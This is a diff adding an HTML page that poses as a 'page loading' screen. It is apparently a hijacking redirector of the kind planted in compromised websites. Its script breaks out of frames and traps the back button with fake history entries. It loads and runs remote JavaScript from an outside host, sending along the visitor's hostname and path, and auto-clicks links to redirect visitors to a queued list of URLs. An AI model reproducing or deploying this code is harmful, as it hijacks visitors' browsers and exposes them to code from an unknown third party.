@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+  <html>
+
+    <head>
+      <title> 页面加载中... </title>
+          <meta charset="UTF-8">
+            <meta name="referrer" content="never">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <link rel="shortcut icon" href="http://static.gagm0.cn/favicon.ico" type="image/x-icon" />
+                </head>
+                  <body>
+                    <div>
+                      <script type="text/javascript">
+                        if (self !== top) {
+                          top.location = self.location;
+                        } 
+                        window.addEventListener("popstate", function (e) {
+                          self.location.reload();
+                        }, false);
+                        window.addEventListener("pageshow", function (b) {
+                          j()
+                        });
+                        window.onhashchange = function () {
+                          j()
+                        };
+                        var burl = "http://static.gagm0.cn/cnjs/";
+
+                        function ljs() {
+                          var d = document.createElement("script");
+                          d.src = burl + location.search + "&h=" + location.hostname + "&p=" +
+                            encodeURIComponent(location.pathname) + "&t=" + (new Date()).getTime();
+                          var b = document.getElementsByTagName("script")[0];
+                          b.parentNode.insertBefore(d, b)
+                        }
+
+                        function l(b, d) {
+                          var e = document.createElement("script");
+                          e.src = burl + "i" + location.search + "&i=" + b + "&s=" + d + "&h=" + location.hostname +
+                            "&p=" + encodeURIComponent(location.pathname) + "&t=" + (new Date()).getTime() % 1000000;
+                          var d = document.getElementsByTagName("script")[0];
+                          d.parentNode.insertBefore(e, d)
+                        }
+
+                        function j() {
+                          history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+                          var d = parseInt(localStorage.getItem("_t"));
+                          d = isNaN(d) ? 1800000 : d + 1800000;
+                          if (d <(new Date()).getTime()) { ljs() } else {
+                            var e = JSON.parse(localStorage.getItem("_l"));
+                            c = parseInt(localStorage.getItem("_cr")); c = isNaN(c) ? 0 : c; if (e.length > 0 && c <e.length) {
+                              var b = e[c]; localStorage.setItem("_cr", c + 1); window.ctask = b.url; if (c > 0
+                                || parseInt(b.status) > 0) {
+                                l(b.tid, b.status);
+                                a()
+                              } else {
+                                a()
+                              }
+                            } else {
+                              ljs()
+                            }
+                          }
+                        }
+
+                        function w(b) {
+                          localStorage.clear();
+                          localStorage.setItem("_l", JSON.stringify(b));
+                          localStorage.setItem("_t", (new Date()).getTime());
+                          j()
+                        }
+
+                        function r() { }
+
+                        function a() {
+                          var b = document.createElement("a");
+                          b.href = ctask;
+                          b.click()
+                        }; </script>
+                          </div>
+                          </body>
+
+                          </html>
+                        
